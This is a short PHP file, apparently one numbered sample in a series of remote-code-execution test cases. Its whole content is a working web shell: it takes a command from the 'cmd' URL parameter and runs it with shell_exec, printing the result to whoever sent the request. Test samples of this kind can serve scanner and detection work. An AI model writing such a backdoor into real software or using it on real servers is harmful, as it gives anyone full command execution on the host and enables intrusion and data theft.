<?php
// RCE test variation #482
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>